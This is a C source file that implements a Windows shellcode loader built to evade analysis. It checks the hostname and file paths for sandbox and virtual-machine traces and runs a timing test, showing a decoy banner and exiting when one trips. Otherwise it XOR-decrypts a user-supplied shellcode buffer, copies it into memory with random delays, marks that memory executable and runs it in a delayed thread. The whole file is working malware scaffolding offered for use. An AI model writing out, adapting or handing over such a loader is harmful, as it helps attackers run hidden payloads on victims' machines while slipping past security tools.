#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <io.h>
#include <unistd.h>
#include <ctype.h>
void XOREncrypt(unsigned char *data, size_t data_len, unsigned char key)
{
    for (size_t i = 0; i < data_len; i++)
    {
        data[i] ^= key;
    }
}
void XORDecrypt(unsigned char *data, size_t data_len, unsigned char key)
{
    for (size_t i = 0; i < data_len; i++)
    {
        data[i] ^= key;
    }
}
void stealthy_copy(void *dest, const void *src, size_t n)
{
    volatile uint8_t *d = (volatile uint8_t *)dest;
    const uint8_t *s = (const uint8_t *)src;
    for (size_t i = 0; i < n; i++)
    {
        d[i] = s[i];
        Sleep(rand() % 10);
    }
}
void banner() {
    printf(
        "                                        .dXl   .  .:xkl'\n"
        "                                         'OKc  .;c'  ,oOk:           \n"
        "                                           ,kKo. .cOkc. .lOk:.       \n"
        "                                             .dXx.  :KWKo. 'dXd.     \n"
        "                                               .oXx.  cXWW0c..dXd.   \n"
        "                                                 oW0   .OWWWNd.'KK.  \n"
        "                                         ....,;lkNWx     KWWWWX:'XK. \n"
        ",o:,                          .,:odkO00XNK0Okxdlc,.     .KWWWWWWddWd \n"
        " K::Ol                   .:d0NXK0OkxdoxO'             .lXWWWWWWWWKW0 \n"
        " od  d0.              .l0NKOxdooooooox0.        .,cdOXWWWWWWWWWWWWWx \n"
        " :O   ;K;           ;kN0kooooooooooooK:  .':ok0NWWWWWWWWWWWWWWWWWWK. \n"
        " 'X    .Kl        ;KNOdooooooooooooooXkkXWWWWWWWWWWWWWWWWWWWWWWWNd.  \n"
        " .N. o. .Kl     'OW0doooooooooooooodkXWWWWWWWWWWWWWWWWWWWWWWWW0l.    \n"
        "  0l oK' .kO:';kNNkoooooooooooook0XWWWWWWWWWWWWWWWWWWWWWWWKx:.       \n"
        "  lX.,WN:  .:c:xWkoooooooooood0NWW0OWWWWWWWWWWWWWWWWWWWKo.           \n"
        "   0O.0WWk'   .XKoooooooooooONWWNo  dWWWWWWWWWWWWWWWWWl\n"
        "    oKkNWWWX00NWXdooooooooxXWWNk'   dWWWWWWWWWWWWWWWWX\n"
        "     .cONWWWWWWWWOoooooooONWWK:...c0WWWWWWWWWWWWWWWWWW:\n"
        "        .;oONWWWWxooooodKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWX.\n"
        "             'XW0oooookNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWd\n"
        "             oW0ooooo0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWO\n"
        "            ;NXdooodKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWx\n"
        "         ;xkOOdooooxOO0KNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWX.\n"
        "        .NOoddxkkkkxxdoookKWWWWWWWWWWWWWWWWWWWWWWWWWWWX'\n"
        "         :KNWWWWWWWWWWX0xooONWWWWWWWWWWWWWWWWWWWWWWWk.\n"
        "        .xNXxKWWWWWWWOXWWXxoKWWWWWWWWWWWWWWWWWWWWNk'\n"
        "        OWl cNWWWWWWWk oNWNxKWWWWWWWWWWWWWWWWWNOl\n"
        "       ,Wk  xWWWWWWWWd  xWWNWWWWWWWWWWWWXOdc,.\n"
        "       .N0   lOXNX0x;  .KWWWWWWWWWWWNkc.\n"
        "        :NO,         'lXWWWWWWWWWNk:\n"
        "         .dXN0OkxkO0NWWWWWWWWWWKl.\n"
        "            .';o0WWWWWWWWWWWNk;\n"
        "                 .cxOKXKKOd;.\n"
    );
    getchar();
}
int isSandbox() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    Sleep(3000);
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        for (int i = 0; hostname[i]; i++)
            hostname[i] = tolower(hostname[i]);
        const char *forbidden[] = {
            "sandbox", "vmware", "vbox", "virtualbox", "debug"
        };
        for (int i = 0; i < sizeof(forbidden)/sizeof(forbidden[0]); i++) {
            if (strstr(hostname, forbidden[i]) != NULL)
                return 1;
        }
    }
    const char *vmFiles[] = {
        "C:\\Program Files\\VMware\\VMware Tools",
        "C:\\Program Files\\Oracle\\VirtualBox",
        "/etc/vmware-tools"
    };
    for (int i = 0; i < sizeof(vmFiles) / sizeof(vmFiles[0]); i++) {
        if (_access(vmFiles[i], 0) == 0) {
            return 1;
        }
    }
    Sleep(3000);
    int t = 1500;
    time_t start = time(NULL);
    Sleep(t);
    time_t end = time(NULL);
    double elapsed = difftime(end, start);
    if (elapsed <= t) {
        return 1;
    }
    return 0;
}
int main()
{
    if(isSandbox()){
        banner();
        exit(0);
    }else{
        srand((unsigned int)time(NULL));
        unsigned char encrypted_shellcode[] = ""; // You need to enter your shellcode which is encrypted with XOR algorithm. You can use XORDecrypt function for this.
        const unsigned char xor_key = 0xAA;       // XOR Key
        XORDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode), xor_key);
        LPVOID exec_mem = VirtualAlloc(
            NULL,
            sizeof(encrypted_shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (exec_mem == NULL)
        {
            return -1;
        }
        stealthy_copy(exec_mem, encrypted_shellcode, sizeof(encrypted_shellcode));
        DWORD old_protect;
        if (!VirtualProtect(
                exec_mem,
                sizeof(encrypted_shellcode),
                PAGE_EXECUTE_READ,
                &old_protect))
        {
            return -1;
        }
        HANDLE thread = CreateThread(
            NULL,
            rand() % 1024,
            (LPTHREAD_START_ROUTINE)exec_mem,
            NULL,
            CREATE_SUSPENDED,
            NULL);

        if (thread == NULL)
        {
            return -1;
        }
        Sleep(rand() % 1000);
        ResumeThread(thread);
        while (WaitForSingleObject(thread, 100) == WAIT_TIMEOUT)
        {
            Sleep(rand() % 100);
        }
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 0;
    }
}
